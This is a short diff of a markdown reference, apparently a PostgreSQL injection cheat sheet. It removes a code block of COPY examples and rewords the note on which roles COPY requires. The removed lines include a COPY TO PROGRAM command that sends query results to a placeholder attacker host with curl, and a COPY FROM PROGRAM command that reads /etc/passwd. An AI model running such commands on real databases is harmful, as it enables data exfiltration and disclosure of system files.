@@ -152,21 +152,7 @@ SELECT database_to_xmlschema(true, true, '');
 
 ### COPY Command
 
-PostgreSQL's COPY is unique and powerful. File operations require superuser or `pg_write_server_files`/`pg_read_server_files` roles; PROGRAM operations require superuser or `pg_execute_server_program` (PostgreSQL 11+).
-
-```sql
--- Copy to file
-COPY users TO '/tmp/users.txt';
-
--- Copy query results
-COPY (SELECT * FROM users) TO '/tmp/data.csv' WITH CSV;
-
--- Copy to program (superuser or pg_execute_server_program)
-COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com -d @-';
-
--- Copy from program (superuser or pg_execute_server_program)
-COPY users FROM PROGRAM 'cat /etc/passwd';
-```
+PostgreSQL's COPY is unique and powerful. File operations require superuser or `pg_write_server_files`/`pg_read_server_files` roles. PROGRAM operations require superuser or `pg_execute_server_program` role (PostgreSQL 11+).
 
 ### Large Objects
 
